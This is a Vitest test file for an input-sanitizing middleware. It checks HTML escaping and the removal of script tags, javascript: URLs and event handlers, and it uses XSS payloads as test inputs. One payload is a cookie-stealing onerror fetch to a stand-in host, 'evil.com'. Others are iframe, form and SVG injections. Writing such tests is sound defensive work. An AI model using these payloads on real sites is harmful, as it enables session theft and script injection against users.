import { describe, expect, it } from 'vitest';
import { sanitizeInput } from '../sanitize';

describe('Sanitize Middleware', () => {
    describe('sanitizeInput', () => {
        describe('HTML tag stripping', () => {
            it('should strip HTML tags by converting to entities', () => {
                const input = '<div>Hello World</div>';
                const result = sanitizeInput(input);
                expect(result).toBe('&lt;div&gt;Hello World&lt;/div&gt;');
            });

            it('should handle nested HTML tags', () => {
                const input = '<div><span>Nested</span></div>';
                const result = sanitizeInput(input);
                expect(result).toBe('&lt;div&gt;&lt;span&gt;Nested&lt;/span&gt;&lt;/div&gt;');
            });

            it('should handle self-closing tags', () => {
                const input = '<br/><img src="test"/>';
                const result = sanitizeInput(input);
                expect(result).toBe('&lt;br/&gt;&lt;img src="test"/&gt;');
            });

            it('should handle tags with attributes', () => {
                const input = '<a href="http://example.com">Link</a>';
                const result = sanitizeInput(input);
                expect(result).toBe('&lt;a href="http://example.com"&gt;Link&lt;/a&gt;');
            });
        });

        describe('Script tag removal', () => {
            it('should remove script tags and their content', () => {
                const input = '<script>alert("XSS")</script>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('script');
                expect(result).not.toContain('alert');
                expect(result).toBe('');
            });

            it('should remove script tags with attributes', () => {
                const input = '<script type="text/javascript">alert("XSS")</script>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('script');
                expect(result).not.toContain('alert');
            });

            it('should remove multiple script tags', () => {
                const input = '<script>alert(1)</script>Text<script>alert(2)</script>';
                const result = sanitizeInput(input);
                expect(result).toBe('Text');
            });

            it('should handle script tags with case variations', () => {
                const input = '<SCRIPT>alert("XSS")</SCRIPT>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('SCRIPT');
                expect(result).not.toContain('alert');
            });

            it('should handle malformed script tags', () => {
                const input = '<script>alert("test")</script>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('alert');
            });
        });

        describe('JavaScript protocol removal', () => {
            it('should remove javascript: protocol', () => {
                const input = 'javascript:alert("XSS")';
                const result = sanitizeInput(input);
                expect(result).not.toContain('javascript:');
                expect(result).toBe('alert("XSS")');
            });

            it('should handle case variations of javascript: protocol', () => {
                const input = 'JavaScript:alert("XSS")';
                const result = sanitizeInput(input);
                expect(result).not.toContain('JavaScript:');
            });

            it('should remove multiple javascript: protocols', () => {
                const input = 'javascript:alert(1) javascript:alert(2)';
                const result = sanitizeInput(input);
                expect(result).not.toContain('javascript:');
            });
        });

        describe('Event handler removal', () => {
            it('should remove onclick event handler', () => {
                const input = 'onclick=alert("XSS")';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onclick=');
                expect(result).toBe('alert("XSS")');
            });

            it('should remove onload event handler', () => {
                const input = 'onload=maliciousFunction()';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onload=');
            });

            it('should remove onerror event handler', () => {
                const input = 'onerror=steal()';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onerror=');
            });

            it('should remove onmouseover event handler', () => {
                const input = 'onmouseover=hack()';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onmouseover=');
            });

            it('should remove event handlers with spaces', () => {
                const input = 'onclick = alert("XSS")';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onclick');
            });

            it('should handle multiple event handlers', () => {
                const input = 'onclick=a() onload=b() onerror=c()';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onclick=');
                expect(result).not.toContain('onload=');
                expect(result).not.toContain('onerror=');
            });
        });

        describe('Whitespace handling', () => {
            it('should trim leading whitespace', () => {
                const input = '   Hello World';
                const result = sanitizeInput(input);
                expect(result).toBe('Hello World');
            });

            it('should trim trailing whitespace', () => {
                const input = 'Hello World   ';
                const result = sanitizeInput(input);
                expect(result).toBe('Hello World');
            });

            it('should trim both leading and trailing whitespace', () => {
                const input = '   Hello World   ';
                const result = sanitizeInput(input);
                expect(result).toBe('Hello World');
            });

            it('should preserve internal whitespace', () => {
                const input = 'Hello   World   Test';
                const result = sanitizeInput(input);
                expect(result).toBe('Hello   World   Test');
            });
        });

        describe('Normal text preservation', () => {
            it('should preserve normal text without changes', () => {
                const input = 'Hello World';
                const result = sanitizeInput(input);
                expect(result).toBe('Hello World');
            });

            it('should preserve text with numbers', () => {
                const input = 'Test 123 456';
                const result = sanitizeInput(input);
                expect(result).toBe('Test 123 456');
            });

            it('should preserve text with special characters (except < >)', () => {
                const input = 'Hello! How are you? Fine, thanks.';
                const result = sanitizeInput(input);
                expect(result).toBe('Hello! How are you? Fine, thanks.');
            });

            it('should preserve URLs without javascript: protocol', () => {
                const input = 'https://example.com';
                const result = sanitizeInput(input);
                expect(result).toBe('https://example.com');
            });

            it('should preserve email addresses', () => {
                const input = 'user@example.com';
                const result = sanitizeInput(input);
                expect(result).toBe('user@example.com');
            });

            it('should preserve unicode characters', () => {
                const input = 'Hello 世界 🌍';
                const result = sanitizeInput(input);
                expect(result).toBe('Hello 世界 🌍');
            });
        });

        describe('Complex XSS attack vectors', () => {
            it('should handle combined attack vector with script and HTML', () => {
                const input = '<div><script>alert("XSS")</script>Safe text</div>';
                const result = sanitizeInput(input);
                expect(result).toBe('&lt;div&gt;Safe text&lt;/div&gt;');
            });

            it('should handle attack with event handler in tag', () => {
                const input = '<img src=x onerror=alert("XSS")>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onerror=');
                expect(result).toContain('&lt;img');
                expect(result).toContain('&gt;');
            });

            it('should handle javascript: in href attribute', () => {
                const input = '<a href="javascript:alert(\'XSS\')">Click</a>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('javascript:');
            });

            it('should handle encoded attack vectors', () => {
                const input = '<script>alert&#40;"XSS"&#41;</script>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('script');
            });
        });

        describe('Edge cases', () => {
            it('should handle empty string', () => {
                const input = '';
                const result = sanitizeInput(input);
                expect(result).toBe('');
            });

            it('should handle string with only whitespace', () => {
                const input = '   ';
                const result = sanitizeInput(input);
                expect(result).toBe('');
            });

            it('should handle very long strings', () => {
                const input = 'a'.repeat(10000);
                const result = sanitizeInput(input);
                expect(result.length).toBe(10000);
                expect(result).toBe(input);
            });

            it('should handle non-string input by returning it unchanged', () => {
                const input = 123 as any;
                const result = sanitizeInput(input);
                expect(result).toBe(123);
            });

            it('should handle null input', () => {
                const input = null as any;
                const result = sanitizeInput(input);
                expect(result).toBe(null);
            });

            it('should handle undefined input', () => {
                const input = undefined as any;
                const result = sanitizeInput(input);
                expect(result).toBe(undefined);
            });

            it('should handle object input', () => {
                const input = { key: 'value' } as any;
                const result = sanitizeInput(input);
                expect(result).toEqual({ key: 'value' });
            });

            it('should handle array input', () => {
                const input = ['test'] as any;
                const result = sanitizeInput(input);
                expect(result).toEqual(['test']);
            });
        });

        describe('Real-world attack scenarios', () => {
            it('should handle image tag with onerror handler', () => {
                const input = '<img src=x onerror=fetch("evil.com?cookie="+document.cookie)>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('onerror=');
            });

            it('should handle SVG with embedded script', () => {
                const input = '<svg><script>alert("XSS")</script></svg>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('script');
                expect(result).not.toContain('alert');
            });

            it('should handle iframe injection', () => {
                const input = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('javascript:');
                expect(result).toContain('&lt;iframe');
            });

            it('should handle form with action', () => {
                const input = '<form action="javascript:alert(\'XSS\')"><input></form>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('javascript:');
            });

            it('should handle link with javascript protocol', () => {
                const input = '<a href="javascript:void(0)" onclick=alert("XSS")>Click</a>';
                const result = sanitizeInput(input);
                expect(result).not.toContain('javascript:');
                expect(result).not.toContain('onclick=');
            });
        });

        describe('Chained sanitization', () => {
            it('should be idempotent (sanitizing twice gives same result)', () => {
                const input = '<script>alert("XSS")</script>Hello<div>World</div>';
                const result1 = sanitizeInput(input);
                const result2 = sanitizeInput(result1);
                expect(result1).toBe(result2);
            });
        });

        describe('Performance', () => {
            it('should handle input with many tags efficiently', () => {
                const input = '<div>'.repeat(100) + 'Content' + '</div>'.repeat(100);
                const start = Date.now();
                const result = sanitizeInput(input);
                const duration = Date.now() - start;

                expect(result).toContain('Content');
                expect(duration).toBeLessThan(100); // Should complete in under 100ms
            });

            it('should handle input with many script tags efficiently', () => {
                const input = '<script>alert(1)</script>'.repeat(50);
                const start = Date.now();
                const result = sanitizeInput(input);
                const duration = Date.now() - start;

                expect(result).not.toContain('script');
                expect(duration).toBeLessThan(100);
            });
        });
    });
});
